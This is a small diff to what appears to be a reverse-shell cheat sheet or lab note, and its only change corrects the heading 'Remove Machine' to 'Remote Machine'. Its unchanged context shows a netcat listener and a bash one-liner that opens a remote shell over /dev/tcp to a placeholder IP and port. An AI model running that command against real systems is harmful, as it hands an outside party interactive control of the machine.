@@ -7,7 +7,7 @@
   nc -lvnp ${PORT}
   ```
   
-  #### Remove Machine
+  #### Remote Machine
   ```bash
   bash -i >& /dev/tcp/${LOCAL_MACHINE_IP}/${PORT} 0>&1
   ```
